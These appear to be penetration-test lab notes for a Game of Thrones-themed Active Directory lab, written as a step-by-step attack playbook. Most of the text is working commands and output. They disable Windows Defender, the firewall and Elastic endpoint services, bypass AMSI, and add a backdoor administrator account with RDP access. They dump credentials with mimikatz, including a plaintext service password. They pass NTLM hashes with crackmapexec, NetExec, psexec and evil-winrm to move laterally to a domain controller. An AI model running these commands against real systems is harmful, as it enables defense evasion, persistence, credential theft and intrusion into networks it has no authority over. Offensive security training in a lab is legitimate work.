
```
Summary:
1.) We started with a session on Castleblack and got the hashes
2.) used Sharphound to dump AD details
3.) Used Bloodhound to discover with Bloodhound that Robb.Stark is admin on trusted domain winterfell
4,) Used robb.stark's HASH and remoted to winterfell
```

Disable defender and AMSI, add a backdoor user for persistence and enable RDP for
easy access. This should be detected by defenders.
Disable firewall:

```PowerShell
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All"
```


```PowerShell
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true
NetSh Advfirewall set allprofiles state off
```

OR when running from command line:
```cmd
powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem \$true -DisableIOAVProtection \$true -DisableRealtimeMonitoring \$true"
```

And bypass AMSI:

```powershell
(([Ref].Assembly.gettypes() | ? {$_. Name -like "Amsi*utils"}).GetFields( "NonPublic, Static") | ? {$_. Name -like "amsiInit*ailed"} ). SetValue($null, $true)
(([Ref].Assembly.GetTypes() | ? { $_.Name -like "Amsi*Utils" }).GetFields("NonPublic,Static") | ? { $_.Name -like "amsiInitFailed" }).SetValue($null,$true)
```

Add Backdoor user and enable RDP, then run bloodhound, much easier
```cmd
net user evilme Password123!! /add
net localgroup "Administrators" evilme /add
net localgroup "Remote Desktop Users" evilme /add
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -
Name "DisableRestrictedAdmin" -Value 0
```

Then RDP access from kali for ease of use.
Note: enable RDP on firewall, else it will not work 
```cmd
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```
We are sharing the /tmp folder from kali with the
victims throughout the engagement to easily move files between victims and kali.

```bash
xfreerdp /v:10.2.10.22 /u:evilme /p:'Password123!!' /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
```

# 3rd Party AV Tools
Have a look for 3rd Party tools such as Waazuh, Elastics, etc.
Stop those services too
```powershell
get-service 'ElasticEndpoint'
stop-service 'ElasticEndpoint'
get-service 'Elastic Agent'
stop-service 'Elastic Agent'
```
# Shaphound
Next we will run Sharphound
Sharphound is a data collector for bloudhound.
Once you RDP to the target box, copy the Sharphound.exe to the desktop from the shared temp you created.

Back on Metasploit, in the system account you are using, run Bloudhound (In CMD). Navigate to where you copied it and run SharpHound
```cmd
cd c:\\users\evilme\\desktop
.\Sharphound -d north.sevenkingdoms.local -c all --zipfilename north_sevenkingdoms.zip

.\Sharphound -d essos.local -c all --zipfilename essos_local.zip
```
-d => Domain
-c => Collect what, e.g.: all
--zipfilename => Save to Zip File

Now copy the zip file to your Kali box (via RDP or whatever method you want)

# Kiwi/mimikatz

Back at metasploit, exit the session by typing "exit" so that you are back at the metasploit framework
Load the kiwi module
```shell
c:\windows\system32\inetsrv>exit
exit
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
```

In Kiwi, run "help" to show the options
```
meterpreter > help
```

Run creds_all and creds_msv to see what passwords you can get
```
creds_all
creds_msv
```

You should be able to get the NTLM HAShes
Also try:
```
lsa_dump_secrets
```

In this example we got a password:
```
Secret  : _SC_MSSQL$SQLEXPRESS / service 'MSSQL$SQLEXPRESS' with username : north.sevenkingdoms.local\sql_svc
cur/text: YouWillNotKerboroast1ngMeeeeee

```

##### Running services on domain account
Next up we will have a look at services which makes use of domain accounts.
In Metepeerter, run ps
```
ps
```

We can later have a look at what user are running services under their account.

# Lateral Movement
## Bloudhound

Start the Bloodhound console:
```
neo4j console
```

Run Bloodhound
```
bloodhound --no-sandbox
```

Import the zip files into Bloodhound.
Do some investigations between the domains and see if there are any trusts and which users has domain access on both of the domains.
In this example, we discovered that robb.stark is part if the domain admins in both north.sevenkingdoms,local and essos.local.

Back in meterpeter, run creds_msv and have a look at robb.stark's password hash.
Copy the hash and try it against the other devices on the network

#### **NOTE: crackmapexec is no longer maintained. Try NetExec**

```
crackmapexec smb 10.2.10.10-23 -u robb.start -H '831486ac7f26860c9e2f51ac91e1a07a'
```
smb => protocol
10.2.10.10-23 => Range of IP's to target
-u => Username
=H => HASH followed by the HASH in single quotes

Example outout:
```shell
──(digit㉿kali)-[~/Documents/Labs/GOAD_2]
└─$ crackmapexec smb 10.2.10.10-23 -u robb.stark -H '831486ac7f26860c9e2f51ac91e1a07a'
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing RDP protocol database
[*] Initializing FTP protocol database
[*] Initializing WINRM protocol database
[*] Initializing SSH protocol database
[*] Initializing MSSQL protocol database
[*] Initializing LDAP protocol database
[*] Initializing SMB protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         10.2.10.12      445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         10.2.10.22      445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         10.2.10.23      445    BRAAVOS          [*] Windows 10 / Server 2019 Build 17763 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:False)
SMB         10.2.10.11      445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         10.2.10.10      445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         10.2.10.12      445    MEEREEN          [-] essos.local\robb.stark:831486ac7f26860c9e2f51ac91e1a07a STATUS_LOGON_FAILURE 
SMB         10.2.10.22      445    CASTELBLACK      [+] north.sevenkingdoms.local\robb.stark:831486ac7f26860c9e2f51ac91e1a07a 
SMB         10.2.10.23      445    BRAAVOS          [+] essos.local\robb.stark:831486ac7f26860c9e2f51ac91e1a07a 
SMB         10.2.10.11      445    WINTERFELL       [+] north.sevenkingdoms.local\robb.stark:831486ac7f26860c9e2f51ac91e1a07a (Pwn3d!)
SMB         10.2.10.10      445    KINGSLANDING     [-] sevenkingdoms.local\robb.stark:831486ac7f26860c9e2f51ac91e1a07a STATUS_LOGON_FAILURE 
```

#### Using NetExec (nxc)
```shell
nxc smb 10.2.10.11-23 -u robb.stark -H '831486ac7f26860c9e2f51ac91e1a07a'
```

nxc with Bloodhound collector:
```shell
nxc ldap 10.2.10.11 -u jon.snow -p iknownothing --bloodhound --collection All --dns-server 10.2.10.11 --dns-tcp --dns-timeout 10

# OR

nxc ldap 10.2.10.11 -u jon.snow -p iknownothing --bloodhound --collection All --dns-server 10.2.10.11
```

In the above output, we can see that 10.2.10.11 (Winterfell) has ben Pwn3d!
Now that we know if works on Winterfell, let pass the HASH
```shell
impacket-psexec -hashes 0000000000000000000000000000000:831486ac7f26860c9e2f51ac91e1a07a robb.stark@10.2.10.11
```

Or try evil-winrm
```
evil-winrm -i 10.2.10.11 -u robb.startk -H "831486ac7f26860c9e2f51ac91e1a07a"
```

